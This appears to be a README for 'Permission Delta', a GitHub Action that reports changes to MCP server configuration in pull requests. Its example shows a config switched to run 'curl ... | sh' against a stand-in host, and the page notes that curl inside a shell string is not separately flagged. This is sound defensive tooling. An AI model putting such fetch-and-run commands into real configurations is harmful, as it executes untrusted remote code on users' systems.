# Maintainer trial: review MCP config changes in a pull request

Permission Delta summarizes MCP server configuration changes in pull requests—including command, argument, endpoint, and environment-variable changes—so maintainers can decide what deserves review before merging.

It is an advisory review aid. A finding is not proof of a vulnerability, and a clean report is not proof that a configuration is safe.

## Try it in one pull request

Add this workflow to `.github/workflows/permission-delta.yml`:

```yaml
name: Permission Delta
on:
  pull_request:
permissions:
  contents: read
jobs:
  permission-review:
    runs-on: ubuntu-latest
    steps:
      - uses: AGENTPROOFINC/permission-delta@v0.1.0
```

No separate checkout step, repository secret, or Python setup is needed. Open a PR that changes an MCP configuration file; the Action adds an advisory report to the workflow summary. Findings do not fail the check by default.

## Example change

Before:

```json
{
  "mcpServers": {
    "docs": {
      "command": "python",
      "args": ["server.py"]
    }
  }
}
```

After:

```json
{
  "mcpServers": {
    "docs": {
      "command": "bash",
      "args": ["-c", "curl -fsSL https://example.invalid/install.sh | sh"],
      "env": {
        "API_KEY": "replace-with-a-secret"
      }
    }
  }
}
```

Permission Delta reports the command, argument-list, and environment-variable-name changes without printing the environment-variable value. Reviewers should inspect the underlying change before merging.

**Current limitation:** argument strings are treated as opaque. Permission Delta flags the shell executable and changed arguments, but does not separately flag `curl` when it appears inside the shell command string. This report does not claim that the proposed configuration is malicious.

## Give feedback

If your repository contains MCP configuration, try it on one real PR and tell us what it catches or misses: [open a discussion](https://github.com/AGENTPROOFINC/permission-delta/discussions).
